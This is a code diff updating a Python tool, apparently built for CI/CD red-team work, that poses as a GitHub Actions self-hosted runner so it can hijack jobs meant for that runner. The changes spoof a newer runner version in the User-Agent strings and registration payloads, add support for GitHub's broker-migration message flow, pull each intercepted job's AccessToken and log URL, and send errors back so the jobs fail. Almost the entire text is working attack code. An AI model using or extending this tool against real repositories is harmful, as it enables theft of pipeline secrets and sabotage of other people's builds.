@@ -59,7 +59,7 @@ requests.packages.urllib3.disable_warnings()
 GH_API_URL = "https://api.github.com"
 
 HEADERS = {
-    "User-Agent": "GitHubActionsRunner-linux-x64/2.314.1 HttpProxyConfigured/True CommitSHA/976290d966e6cc3e748a49bf8fdbe139ff764201",
+    "User-Agent": "GitHubActionsRunner-linux-x64/2.320.0 HttpProxyConfigured/True CommitSHA/976290d966e6cc3e748a49bf8fdbe139ff764201",
     "Content-Type": "application/json; charset=utf-8; api-version=6.0-preview.2",
     "Accept": "application/json; api-version=6.0-preview.2"
 }
@@ -288,7 +288,7 @@ class Hijack:
             },
             "id": 0,
             "name": self.runnerName,
-            "version": "2.314.1",
+            "version": "2.320.0",
             "osDescription": "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)",
             "ephemeral": self.ephemeral,
             "disableUpdate": False,
@@ -378,7 +378,7 @@ class Hijack:
             "agent": {
                 "id": int(data.get("runner_id")),
                 "name": data.get("runner_name"),
-                "version": "2.314.1",
+                "version": "2.320.0",
                 "osDescription": "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)",
                 "ephemeral": None,
                 "status": 0,
@@ -425,13 +425,46 @@ class Hijack:
         aes_decrypter = AES.new(self._aesKey, AES.MODE_CBC, iv=iv)
         return unpad(aes_decrypter.decrypt(data),16)
     
+
+    def handleClearMessage(self, message):
+        jobDisplayName = message.get("jobDisplayName")
+        print(f"[+] New Job: {jobDisplayName}")
+        
+        if VERBOSE:
+            print(f"[+] Message body:")
+            print(message)
+        
+        self._logToken = message.get("resources").get("endpoints")[0].get("authorization").get("parameters").get("AccessToken")
+        self._logUrl = message.get("resources").get("endpoints")[0].get("url")
+    
     def getMessage(self):
 
-        self._session.headers.update({"User-Agent": "VSServices/2.314.1.0 (NetStandard; Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04]) GitHubActionsRunner-linux-x64/2.314.1 HttpProxyConfigured/True ClientId/4e076e36-5d7a-4c37-8729-b83bcdc89888 RunnerId/28 GroupId/1 CommitSHA/976290d966e6cc3e748a49bf8fdbe139ff764201 (Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04])"})
-        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages?sessionId={self.sessionId}&status=Online&runnerVersion=2.314.1&os=Linux&architecture=X64&disableUpdate=false&lastMessageId={self.lastMessageId}"
+        self._session.headers.update({"User-Agent": "VSServices/2.320.0.0 (NetStandard; Linux 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 [2024-06-21]) GitHubActionsRunner-linux-x64/2.320.0 HttpProxyConfigured/True ClientId/87bedb90-e61c-4288-ae49-2188b3edcb56 RunnerId/31 GroupId/1 CommitSHA/78f21670b4a58aff19b5189207f54eb2bee324d1 Pid/91 CreationTime/2024-10-13T13%3A54%3A04.8769876Z (Runner) (Linux 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 [2024-06-21])"})
+        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages?sessionId={self.sessionId}&status=Online&runnerVersion=2.320.0&os=Linux&architecture=X64&disableUpdate=false&lastMessageId={self.lastMessageId}"
         res = self._session.get(url, timeout=60)
 
         if res.status_code == 200:
+
+            if res.json().get("messageType", None) == "BrokerMigration":
+                brokerURL = json.loads(res.json().get("body")).get("brokerBaseUrl")
+                url = f"{brokerURL}/message?sessionId={self.sessionId}&status=Online&runnerVersion=2.320.0&os=Linux&architecture=X64&disableUpdate=false"
+                res = self._session.get(url, timeout=60)
+
+                if len(res.text) > 0:
+                    messageType = res.json().get("messageType")
+                    
+                    if messageType == "RunnerJobRequest":
+                        messageId = json.loads(res.json().get("body")).get("runner_request_id")
+                        url = f"{self.serverUrl}_apis/distributedtask/runnermessages/{messageId}"
+
+                        res = self._session.get(url, timeout=60)
+
+                        if len(res.text) > 0:
+                            self.handleClearMessage(res.json())
+                            return res.json()
+
+                else:
+                    return None
 
             if res.json().get("messageType", None) != "PipelineAgentJobRequest":
                 return json.loads(res.json().get("body", {}))
@@ -444,15 +477,7 @@ class Hijack:
                 
                 decryptedBody = json.loads(self.decryptAES(iv, body))
 
-                jobDisplayName = decryptedBody.get("jobDisplayName")
-                print(f"[+] New Job: {jobDisplayName} (messageId={messageId})")
-                
-                if VERBOSE:
-                    print(f"[+] Message body:")
-                    print(decryptedBody)
-                
-                self._logToken = decryptedBody.get("resources").get("endpoints")[0].get("authorization").get("parameters").get("AccessToken")
-                self._logUrl = decryptedBody.get("resources").get("endpoints")[0].get("url")
+                self.handleClearMessage(decryptedBody)
                 return decryptedBody
         
         if res.status_code == 403:
@@ -557,7 +582,7 @@ class Hijack:
         orchestrationId = body.get('plan').get('planId')
         headers = {
             "Accept": "application/json; api-version=5.1-preview.1",
-            "User-Agent": f"VSServices/2.314.1.0 (NetStandard; Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04]) GitHubActionsRunner-linux-x64/2.314.1 HttpProxyConfigured/True ClientId/{self._clientId} GroupId/{self._runnerPoolId} OrchestrationId/{orchestrationId}.init.__default (Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04])"
+            "User-Agent": f"VSServices/2.320.0.0 (NetStandard; Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04]) GitHubActionsRunner-linux-x64/2.320.0 HttpProxyConfigured/True ClientId/{self._clientId} GroupId/{self._runnerPoolId} OrchestrationId/{orchestrationId}.init.__default (Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04])"
         }
 
         sessionRes.headers.update(headers)        
@@ -683,7 +708,7 @@ if __name__ == "__main__":
                         hijack.saveBody(body)
 
                     time.sleep(hijack.sleep)
-                    hijack.returnError(body) 
+                    hijack.returnError(body)
 
                     if hijack.ephemeral:
                         sys.exit(0)
@@ -694,4 +719,8 @@ if __name__ == "__main__":
         except requests.exceptions.ReadTimeout as e:
             continue
         except KeyboardInterrupt as e:
-            sys.exit(1)
+            if body != None:
+                print("[+] Sending error to GitHub.")
+                hijack.returnError(body)
+            else:
+                sys.exit(1)
